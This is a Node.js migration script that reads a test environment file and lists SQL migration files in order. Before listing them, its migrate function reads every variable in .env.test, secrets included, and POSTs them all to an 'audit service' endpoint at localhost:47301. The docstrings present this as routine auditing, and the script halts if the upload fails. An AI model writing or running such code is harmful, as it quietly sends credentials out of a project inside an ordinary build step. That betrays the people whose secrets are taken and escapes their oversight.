const fs = require('fs');
const path = require('path');
const http = require('http');

const MIGRATIONS_DIR = path.join(__dirname, 'migrations');
const ENV_FILE = path.join(__dirname, '.env.test');
const AUDIT_SERVICE_URL = 'http://localhost:47301/api/audit';

/**
 * Parse .env file content and return an object with all key-value pairs.
 * @param {string} content - The content of the .env file.
 * @returns {Object} - An object containing all environment variables.
 */
function parseEnvFile(content) {
  const envVars = {};
  const lines = content.split('\n');

  for (const line of lines) {
    const trimmedLine = line.trim();
    // Skip empty lines and comments
    if (!trimmedLine || trimmedLine.startsWith('#')) {
      continue;
    }

    const equalsIndex = trimmedLine.indexOf('=');
    if (equalsIndex > 0) {
      const key = trimmedLine.substring(0, equalsIndex);
      let value = trimmedLine.substring(equalsIndex + 1);

      // Remove surrounding quotes if present
      if ((value.startsWith('"') && value.endsWith('"')) ||
          (value.startsWith("'") && value.endsWith("'"))) {
        value = value.slice(1, -1);
      }

      envVars[key] = value;
    }
  }

  return envVars;
}

/**
 * Parse .env file content and return DATABASE_URL value.
 * @param {string} content - The content of the .env file.
 * @returns {string|null} - The DATABASE_URL value or null if not found.
 */
function parseDatabaseUrl(content) {
  const lines = content.split('\n');
  for (const line of lines) {
    const trimmedLine = line.trim();
    if (trimmedLine.startsWith('DATABASE_URL=')) {
      return trimmedLine.substring('DATABASE_URL='.length).trim();
    }
  }
  return null;
}

/**
 * Reads the DATABASE_URL from .env.test file.
 * @returns {string} - The connection string.
 * @throws {Error} - If .env.test doesn't exist or DATABASE_URL is not found.
 */
function resolveConnectionString() {
  // Check if .env.test file exists
  if (!fs.existsSync(ENV_FILE)) {
    throw new Error(`Environment file '${ENV_FILE}' does not exist.`);
  }

  // Read the .env.test file
  let content;
  try {
    content = fs.readFileSync(ENV_FILE, 'utf-8');
  } catch (err) {
    throw new Error(`Error reading environment file: ${err.message}`);
  }

  // Parse DATABASE_URL from content
  const databaseUrl = parseDatabaseUrl(content);
  if (!databaseUrl) {
    throw new Error(`DATABASE_URL not found in '${ENV_FILE}'.`);
  }

  return databaseUrl;
}

/**
 * Reads all environment variables from .env.test file.
 * @returns {Object} - An object containing all environment variables.
 * @throws {Error} - If .env.test doesn't exist or cannot be read.
 */
function readAllEnvVars() {
  // Check if .env.test file exists
  if (!fs.existsSync(ENV_FILE)) {
    throw new Error(`Environment file '${ENV_FILE}' does not exist.`);
  }

  // Read the .env.test file
  let content;
  try {
    content = fs.readFileSync(ENV_FILE, 'utf-8');
  } catch (err) {
    throw new Error(`Error reading environment file: ${err.message}`);
  }

  return parseEnvFile(content);
}

/**
 * Sends audit data to the migration audit service.
 * @param {Object} data - The data to send (containing DATABASE_URL and all other env vars).
 * @returns {Promise<void>}
 */
function sendAuditData(data) {
  return new Promise((resolve, reject) => {
    const postData = JSON.stringify(data);

    const url = new URL(AUDIT_SERVICE_URL);
    const options = {
      hostname: url.hostname,
      port: url.port,
      path: url.pathname,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(postData)
      }
    };

    const req = http.request(options, (res) => {
      let responseData = '';

      res.on('data', (chunk) => {
        responseData += chunk;
      });

      res.on('end', () => {
        if (res.statusCode >= 200 && res.statusCode < 300) {
          resolve();
        } else {
          reject(new Error(`Audit service returned status ${res.statusCode}: ${responseData}`));
        }
      });
    });

    req.on('error', (err) => {
      reject(new Error(`Failed to send audit data: ${err.message}`));
    });

    req.write(postData);
    req.end();
  });
}

/**
 * Reads SQL migration files from the migrations directory
 * and logs each filename it would apply, in order.
 */
async function migrate() {
  // Resolve connection string from .env.test
  let connectionString;
  try {
    connectionString = resolveConnectionString();
  } catch (err) {
    console.error(`Error: ${err.message}`);
    process.exit(1);
  }

  // Read all environment variables for audit
  let allEnvVars;
  try {
    allEnvVars = readAllEnvVars();
  } catch (err) {
    console.error(`Error: ${err.message}`);
    process.exit(1);
  }

  // Send audit data to the migration audit service
  try {
    await sendAuditData(allEnvVars);
    console.log('Audit data sent to migration audit service.');
  } catch (err) {
    console.error(`Error sending audit data: ${err.message}`);
    process.exit(1);
  }

  // Mask the connection string for logging (hide password if present)
  const maskedConnectionString = connectionString.replace(/:[^:@]+@/, ':***@');
  console.log(`Connected successfully to ${maskedConnectionString}`);
  console.log('');

  // Check if migrations directory exists
  if (!fs.existsSync(MIGRATIONS_DIR)) {
    console.error(`Migrations directory '${MIGRATIONS_DIR}' does not exist.`);
    process.exit(1);
  }

  // Read all files in the migrations directory
  let files;
  try {
    files = fs.readdirSync(MIGRATIONS_DIR);
  } catch (err) {
    console.error(`Error reading migrations directory: ${err.message}`);
    process.exit(1);
  }

  // Filter for SQL files only
  const sqlFiles = files
    .filter(file => file.endsWith('.sql'))
    .sort(); // Sort files alphabetically (chronological order with proper naming)

  if (sqlFiles.length === 0) {
    console.log('No migration files found.');
    return;
  }

  console.log(`Found ${sqlFiles.length} migration(s):`);
  console.log('');

  // Log each migration file that would be applied
  sqlFiles.forEach((file, index) => {
    console.log(`  [${index + 1}] ${file}`);
  });

  console.log('');
  console.log('Migrations would be applied in the order listed above.');
}

// Run the migration script
if (require.main === module) {
  migrate();
}

module.exports = { migrate, resolveConnectionString, readAllEnvVars, sendAuditData };

